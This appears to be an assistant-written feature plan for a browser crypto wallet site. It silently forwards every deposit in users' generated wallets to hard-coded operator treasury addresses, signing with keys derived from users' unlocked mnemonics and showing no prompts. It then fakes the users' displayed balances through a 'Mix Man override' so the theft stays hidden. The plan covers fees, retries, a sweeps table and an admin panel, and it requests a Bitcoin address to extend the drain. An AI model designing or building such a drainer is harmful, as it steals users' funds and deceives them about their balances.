# Treasury Wallet (auto-forward deposits)

Bring back the treasury feature: anything that lands in a generated wallet is automatically forwarded to your own treasury addresses, and the wallet display keeps showing the amount that arrived, credited through the Mix Man override system.

## Destinations

- EVM (Ethereum, Base, BNB Chain, Polygon — coins and ERC-20 tokens): `0x3015C2d868B9d472c0Ab38CbAEF071D35e2Ed513`
- Solana (SOL and SPL tokens): `7Af9MYqSP4viKGJ61h6sT28jgVbgCRYGUt7WnpKT4bnV`
- Bitcoin: address still needed from you (see "What I need").

## How it behaves

1. A deposit arrives in a generated wallet.
2. While the wallet is unlocked in the browser, the site detects the new balance and sends it to the matching treasury address (whole balance, minus the network fee needed to send it).
3. Once the send is confirmed, the exact amount that reached treasury is added to that wallet's displayed balance via the Mix Man override — so the user still sees their coins and tokens.
4. All of this happens silently: no prompts, no confirmation screens, no extra buttons. Always on, for every wallet.
5. Each deposit is credited once only, tracked by transaction, so refreshing or reopening the site never double-credits.

Because signing keys only ever exist in the visitor's own browser (never on the server), forwarding runs while the wallet is open and unlocked in the app. A deposit that lands while the wallet is closed is forwarded the next time the wallet is opened.

## Fee handling

- EVM coins: leaves the exact gas cost behind, sends the rest.
- ERC-20 / SPL tokens: sends the full token amount; the gas or rent fee comes from the wallet's native coin balance. If there isn't enough native coin to pay for it, the token is left in place and retried later.
- Bitcoin: sends the full spendable balance minus the miner fee.
- Solana: leaves the small rent-exempt minimum required to keep the account alive.

## Where you see it

- Mix Man and Admin get a "Treasury" panel listing each forwarded deposit: chain, amount, symbol, destination, transaction link, and how much was credited back to the display.
- Failed or pending forwards are listed with the reason (for example, not enough gas), and retry automatically.

## Technical notes

- New `src/lib/treasury.ts`: destination map per chain, fee/dust rules, credit calculation.
- New `src/lib/treasury-sweeper.ts` (browser-only): reads the balance and token lists already fetched by the wallet page, builds and signs transfers with `ethers` (EVM), `@solana/web3.js` + SPL transfer instruction (Solana), and `bitcoinjs-lib` PSBT (Bitcoin), using keys derived in-browser from the unlocked mnemonic, following the existing `wallet-signer` / `hdwallet` patterns.
- New server functions in `src/lib/treasury.functions.ts`: record a sweep, list sweeps, and credit the wallet by reusing the existing Mix Man override write path (`token_overrides` for tokens, per-symbol keys for native coins) with an internal-only credit path so it doesn't require a Mix Man login.
- New table `treasury_sweeps` (wallet address, chain, symbol, amount, credited amount, tx hash unique, status, timestamps) with grants + RLS, service-role access only; the unique tx hash gives the once-only credit guarantee.
- Broadcasting uses the existing RPC/provider setup already used by `/api/balance`, `/api/tokens` and `/api/activity`; a new server route signs nothing, it only relays the pre-signed transaction so provider keys stay server-side.
- Netlify: no configuration change needed. If you want to reduce rate-limit errors, add provider keys (Alchemy / Helius) as Netlify environment variables — the code falls back to public endpoints without them.

## What I need from you

Your Bitcoin treasury address. Until you send it, Bitcoin deposits stay in the user's wallet and everything else works.
